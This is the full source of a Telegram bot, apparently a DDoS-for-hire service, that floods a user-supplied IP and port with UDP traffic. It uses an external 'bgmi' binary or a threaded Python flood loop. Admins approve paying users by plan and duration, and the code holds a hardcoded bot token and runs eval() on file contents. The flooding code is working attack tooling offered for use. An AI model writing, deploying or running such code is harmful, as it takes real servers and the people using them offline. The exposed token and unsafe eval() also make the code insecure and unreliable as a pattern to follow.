CREATOR = "This File Is Made By @SahilModzOwner"  # DO NOT CHANGE
import hashlib, os, telebot, asyncio, logging, socket, time, platform, subprocess
from datetime import datetime, timedelta
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread, Lock
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask

# ---------- FLASK HEALTH CHECK FOR RENDER ----------
web_app = Flask(__name__)

@web_app.route('/')
def home():
    return "Bot is running!"

def run_flask():
    web_app.run(host='0.0.0.0', port=8080)

# ---------- CONFIG ----------
TOKEN = '8607310920:AAEZWKCoULqvS-lWsY_uhLbC6g5NdWG-vBg'
bot = telebot.TeleBot(TOKEN)
ADMIN_IDS = [2085082046]  # Replace with actual admin IDs
USERS_FILE = 'users.txt'
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

BGMI_BINARY = './bgmi'
MAX_THREADS = 4  # Python fallback threads

# ---------- EVENT LOOP (BINA WARNING) ----------
loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)

# ---------- ACTIVE ATTACK TRACKER ----------
active_attacks = {}
attack_lock = Lock()

# ---------- INTEGRITY CHECK ----------
def verify():
    Attack = "fc9dc7b267c90ad8c07501172bc15e0f10b2eb572b088096fb8cc9b196caea97"
    if hashlib.sha256(CREATOR.encode()).hexdigest() != Attack:
        raise Exception("Don't Make Any Changes in The Creators Name.")
verify()

# ---------- HELPER: BINARY COMPATIBLE? ----------
def bgmi_is_usable():
    if not os.path.isfile(BGMI_BINARY):
        return False
    try:
        result = subprocess.run(['file', BGMI_BINARY], capture_output=True, text=True)
        arch = platform.machine()
        # Render uses x86_64, but if this is ARM, deny
        if 'x86-64' in result.stdout and ('arm' in arch or 'aarch64' in arch):
            return False
        return True
    except:
        return False

# ---------- PYTHON UDP FLOOD ----------
def udp_flood_thread(target_ip, target_port, duration, shared_packets, lock):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(0.1)
    payload = b'\x00' * 1400
    addr = (target_ip, target_port)
    end = time.time() + duration
    pkt = 0
    while time.time() < end:
        try:
            sock.sendto(payload, addr)
            pkt += 1
        except:
            pass
    sock.close()
    with lock:
        shared_packets[0] += pkt

async def python_flood_attack(target_ip, target_port, duration, chat_id, message_id):
    total = [0]
    lock = Lock()
    try:
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = [executor.submit(udp_flood_thread, target_ip, target_port, duration, total, lock) for _ in range(MAX_THREADS)]
            # Wait for all to finish (no edit in between)
            for f in futures:
                f.result()
        total_packets = total[0]
        bot.edit_message_text(
            chat_id=chat_id, message_id=message_id,
            text=f"✅ Attack Completed!\n🎯 {target_ip}:{target_port}\n⏱ {duration}s\n📦 Packets: {total_packets:,}"
        )
    except Exception as e:
        bot.edit_message_text(
            chat_id=chat_id, message_id=message_id,
            text=f"❌ Attack Failed!\n⚠️ {str(e)[:200]}"
        )
    finally:
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]

# ---------- BGMI BINARY ATTACK ----------
async def bgmi_attack(target_ip, target_port, duration, chat_id, message_id):
    cmd = [BGMI_BINARY, target_ip, str(target_port), str(duration), '1300']
    try:
        process = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        try:
            stdout, stderr = await asyncio.wait_for(process.communicate(), timeout=int(duration) + 15)
        except asyncio.TimeoutError:
            process.kill()
            await process.wait()
            bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                text="⚠️ Match server response timed out. Please check your network.")
            return
        if process.returncode == 0:
            out = stdout.decode().strip()[:200]
            bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                text=f"✅ Attack Completed!\n🎯 {target_ip}:{target_port}\n⏱ {duration}s\n📄 {out}")
        else:
            err = stderr.decode().strip()[:200]
            bot.edit_message_text(chat_id=chat_id, message_id=message_id,
                text=f"❌ Attack Failed!\n🔴 Code {process.returncode}\n🔴 {err}")
    except Exception as e:
        bot.edit_message_text(chat_id=chat_id, message_id=message_id,
            text=f"❌ Attack Error! {e}")
    finally:
        with attack_lock:
            if chat_id in active_attacks:
                del active_attacks[chat_id]

# ---------- UNIFIED ATTACK ----------
async def run_attack_command_async(target_ip, target_port, duration, chat_id, message_id):
    attack_info = {
        "target": f"{target_ip}:{target_port}",
        "start": time.time(),
        "duration": int(duration),
        "type": "bgmi" if bgmi_is_usable() else "python"
    }
    with attack_lock:
        active_attacks[chat_id] = attack_info
    if bgmi_is_usable():
        await bgmi_attack(target_ip, target_port, duration, chat_id, message_id)
    else:
        await python_flood_attack(target_ip, target_port, duration, chat_id, message_id)

# ---------- ADMIN & APPROVAL ----------
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

def check_user_approval(user_id):
    if not os.path.exists(USERS_FILE):
        return False
    with open(USERS_FILE) as f:
        for line in f:
            if line.strip():
                data = eval(line.strip())
                if data['user_id'] == user_id and data['plan'] > 0:
                    return True
    return False

def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "❌ YOU ARE NOT APPROVED")

@bot.message_handler(commands=['approve', 'disapprove'])
def approve_disapprove(msg):
    if not is_user_admin(msg.from_user.id):
        bot.send_message(msg.chat.id, "⛔ NOT APPROVED")
        return
    parts = msg.text.split()
    if len(parts) < 2:
        bot.send_message(msg.chat.id, "Format: /approve <user_id> <plan> <days> or /disapprove <user_id>")
        return
    action = parts[0]
    target = int(parts[1])
    plan = int(parts[2]) if len(parts) >= 3 else 0
    days = int(parts[3]) if len(parts) >= 4 else 0
    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days else datetime.now().date().isoformat()
        info = {"user_id": target, "plan": plan, "valid_until": valid_until, "access_count": 0}
        with open(USERS_FILE, 'a') as f:
            f.write(f"{info}\n")
        bot.send_message(msg.chat.id, f"✅ User {target} approved (plan {plan}, {days} days)")
    else:
        lines = []
        with open(USERS_FILE) as f:
            for line in f:
                if line.strip():
                    d = eval(line.strip())
                    if d['user_id'] != target:
                        lines.append(line)
        with open(USERS_FILE, 'w') as f:
            f.writelines(lines)
        bot.send_message(msg.chat.id, f"❌ User {target} disapproved")

# ---------- ATTACK COMMAND ----------
@bot.message_handler(commands=['Attack'])
def attack_cmd(msg):
    if not check_user_approval(msg.from_user.id):
        send_not_approved_message(msg.chat.id)
        return
    bot.send_message(msg.chat.id, "📝 Enter: IP port duration")
    bot.register_next_step_handler(msg, process_attack)

def process_attack(msg):
    try:
        parts = msg.text.split()
        if len(parts) != 3:
            bot.send_message(msg.chat.id, "❌ Format: IP port duration")
            return
        ip = parts[0]
        port = int(parts[1])
        dur = int(parts[2])
        if port in blocked_ports:
            bot.send_message(msg.chat.id, f"🚫 Port {port} blocked")
            return
        sent = bot.send_message(msg.chat.id,
            f"🚀 Attack Dispatched!\n🎯 {ip}:{port}\n⏳ {dur} sec\n👤 {msg.from_user.first_name}\nMonitor: /status")
        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(ip, port, dur, msg.chat.id, sent.message_id),
            loop)
    except Exception as e:
        bot.send_message(msg.chat.id, f"⚠️ Error: {e}")

# ---------- LIVE STATUS ----------
@bot.message_handler(commands=['status'])
def status_cmd(msg):
    chat_id = msg.chat.id
    with attack_lock:
        attack = active_attacks.get(chat_id)
    if not attack:
        bot.send_message(chat_id, "🟢 No active attack.")
        return
    elapsed = int(time.time() - attack['start'])
    remaining = max(0, attack['duration'] - elapsed)
    response = (
        f"🔥 ATTACK IN PROGRESS\n"
        f"🎯 Target: {attack['target']}\n"
        f"⚙️ Type: {attack['type']}\n"
        f"⏱️ Elapsed: {elapsed}s / {attack['duration']}s\n"
        f"⏳ Remaining: {remaining}s\n"
        f"📦 Packets: counting... (see final message)"
    )
    bot.send_message(chat_id, response)

# ---------- APPROVE LIST ----------
@bot.message_handler(commands=['approve_list'])
def approve_list(msg):
    if not is_user_admin(msg.from_user.id):
        send_not_approved_message(msg.chat.id)
        return
    if not os.path.exists(USERS_FILE):
        bot.send_message(msg.chat.id, "No users found.")
        return
    approved = []
    with open(USERS_FILE) as f:
        for line in f:
            if line.strip():
                d = eval(line.strip())
                if d['plan'] > 0:
                    approved.append(d)
    if not approved:
        bot.send_message(msg.chat.id, "No approved users found.")
        return
    filename = "approved.txt"
    with open(filename, 'w') as f:
        for u in approved:
            f.write(f"ID: {u['user_id']}, Plan: {u['plan']}, Until: {u.get('valid_until', 'N/A')}\n")
    with open(filename, 'rb') as f:
        bot.send_document(msg.chat.id, f)
    os.remove(filename)

# ---------- START MENU ----------
@bot.message_handler(commands=['start'])
def send_welcome(msg):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    markup.add(KeyboardButton("Attack 🚀"), KeyboardButton("My Account🏦"))
    bot.send_message(msg.chat.id, "🔥 Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(msg):
    if not check_user_approval(msg.from_user.id):
        send_not_approved_message(msg.chat.id)
        return
    if msg.text == "Attack 🚀":
        attack_cmd(msg)
    elif msg.text == "My Account🏦":
        user_id = msg.from_user.id
        with open(USERS_FILE) as f:
            for line in f:
                if line.strip():
                    d = eval(line.strip())
                    if d['user_id'] == user_id:
                        uname = msg.from_user.username
                        plan = d.get('plan', 'N/A')
                        valid_until = d.get('valid_until', 'N/A')
                        current_time = datetime.now().isoformat()
                        response = (f"👤 USERNAME: {uname}\n"
                                    f"📊 Plan: {plan}\n"
                                    f"📅 Valid Until: {valid_until}\n"
                                    f"🕒 Current Time: {current_time}")
                        bot.reply_to(msg, response)
                        return
        bot.reply_to(msg, "No account information found.")
    else:
        bot.reply_to(msg, "❌ Invalid option. Use the buttons below.")

# ---------- THREADS STARTUP ----------
def start_asyncio_loop():
    asyncio.set_event_loop(loop)
    loop.run_until_complete(asyncio.sleep(1))  # just keep alive (the actual sleep loop inside run_attack is called on demand)

if __name__ == "__main__":
    # Flask thread
    Thread(target=run_flask, daemon=True).start()
    # Asyncio loop thread
    Thread(target=start_asyncio_loop, daemon=True).start()
    # Bot polling (blocking)
    bot.polling(none_stop=True)